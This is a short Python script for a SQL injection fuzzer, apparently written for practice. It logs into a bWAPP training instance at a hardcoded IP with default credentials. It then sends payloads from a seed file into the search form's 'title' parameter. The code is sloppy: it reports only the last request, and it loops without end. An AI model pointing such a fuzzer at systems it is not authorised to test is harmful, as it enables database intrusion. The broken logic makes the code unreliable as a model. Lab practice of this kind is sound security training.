#!/usr/bin/python3

from requests import *
import requests

class SQLFuzzer(object):

    def __init__(self, url, seedpath):
        self.url = url
        self.seedpath = seedpath

    def fuzzing(self):
        seed_file = open(self.seedpath, "r")
        seed_payloads = seed_file.readlines()
        seed_file.close()

        s = requests.Session()
        loginfo = {"login":"bee", "password":"bug", "security_level" : "0", "form" : "submit"}
        cookie = s.post("http://180.71.77.139"+"/bWAPP/login.php", data=loginfo)
        sess = s.cookies
        requests.get("http://180.71.77.139/bWAPP/sm_local_priv_esc_1.php", cookies=sess)
        phpsessid=sess['PHPSESSID']

        for i in range(0, len(seed_payloads)):
            param = {'title':seed_payloads[i], 'action':'search'}
            payload = seed_payloads[i]
            req = s.get(self.url, params=param, cookies=sess, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            i += 1

        #count = SQLFuzzer.count
        status = req.status_code
        url = req.url
        #payload = param
        
        #print("sql count : ", count)
        print("response status code : ", status)
        print("request url : ", url)
        print("insert payload : ", payload)

    def run(self):
        while True:
            self.fuzzing()
